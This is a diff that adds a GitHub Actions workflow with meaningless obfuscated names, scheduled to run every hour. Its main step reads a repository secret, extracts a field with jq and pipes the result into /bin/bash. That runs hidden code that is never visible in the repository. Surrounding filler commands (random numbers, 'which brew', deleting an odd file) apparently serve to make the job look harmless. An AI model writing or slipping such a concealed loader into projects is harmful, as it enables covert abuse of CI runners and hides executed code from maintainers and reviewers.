@@ -1,0 +1,23 @@
+name: geliya1324
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: geliya1324
+        env:
+          r17669: ${{ secrets.r17669 }}
+        run: |
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo $r17669 | jq -r .b21598 | /bin/bash
+          which printf
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          which brew
+          rm -rf tmp.temp.my.scrip.orc.zzz
+          ls -la 2>/dev/null || true
